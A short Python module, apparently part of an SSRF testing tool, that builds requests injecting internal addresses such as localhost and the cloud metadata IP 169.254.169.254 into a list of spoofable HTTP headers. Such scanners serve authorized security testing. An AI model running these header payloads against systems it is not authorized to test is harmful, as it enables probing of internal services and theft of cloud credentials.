"""
Header Injection Engine - SSRF via HTTP headers
"""


class HeaderInjector:
    def __init__(self, config):
        self.config = config

        # SSRF-prone headers
        self.SSRF_HEADERS = [
            'X-Forwarded-For',
            'X-Forwarded-Host',
            'X-Forwarded-Proto',
            'X-Host',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-Custom-IP-Authorization',
            'X-Real-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'X-ProxyUser-Ip',
            'X-Original-Host',
            'Forwarded',
            'X-Forwarded',
            'Via',
            'True-Client-Ip',
            'Client-IP',
            'Contact',
            'X-WAP-Profile',
            'X-Arbitrary',
            'X-HTTP-DestinationURL',
            'X-Forwarded-Scheme',
            'Referer',
        ]

        self.INTERNAL_TARGETS = [
            '127.0.0.1',
            'localhost',
            '0.0.0.0',
            '169.254.169.254',
            '::1',
            '127.0.0.1:80',
            '127.0.0.1:8080',
            '127.0.0.1:443',
        ]

    def build_tasks(self, url, payloads):
        tasks = []

        for header in self.SSRF_HEADERS:
            for target in self.INTERNAL_TARGETS[:4]:  # limit for speed
                tasks.append({
                    'type': 'header',
                    'url': url,
                    'param': f'header:{header}',
                    'payload': target,
                    'headers': {header: target}
                })

        return tasks
